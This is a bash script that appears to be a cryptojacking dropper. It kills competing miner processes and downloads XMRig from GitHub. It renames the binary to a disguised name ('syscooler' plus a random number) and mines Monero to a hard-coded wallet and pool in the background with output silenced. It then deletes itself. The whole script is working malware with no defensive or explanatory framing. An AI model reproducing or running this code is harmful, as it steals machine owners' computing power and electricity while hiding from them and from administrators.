#!/usr/bin/env bash 

WALLET=458EEu3hXGVcfSi9Uhrwa68DmC2HcAmwRNK4y3yCsV7gQzoGs8GyyZKbzMmZstEiv5ZsbXnMNEZgzLgEAKV2BycK1fFHRVE
POOL=pool.supportxmr.com:443




MINER_PROCESSES=("xmrig" "xmr-stak" "ccminer" "ethminer" "cgminer" "cpuminer" "sgminer" "bfgminer" "lolMiner" "kfc_eater" "kfc" "eatkfc")
for process in "${MINER_PROCESSES[@]}"; do
  pids=$(pgrep "$process")
  if [ -n "$pids" ]; then
    kill "$pids"
  fi
done

curl -s -O -L https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-x64.tar.gz
tar -zxvf xmrig-6.21.0-linux-x64.tar.gz
cd xmrig-6.21.0

random_number=$RANDOM
mv xmrig syscooler"$random_number"
current_date=$(date +"%Y%m%d")
./syscooler"$random_number" --donate-level 1 -o "$POOL" -u "$WALLET" -k --tls -p sysx"$current_date"_eater"$random_number" &  >/dev/null 2>&1 &


rm "$0"
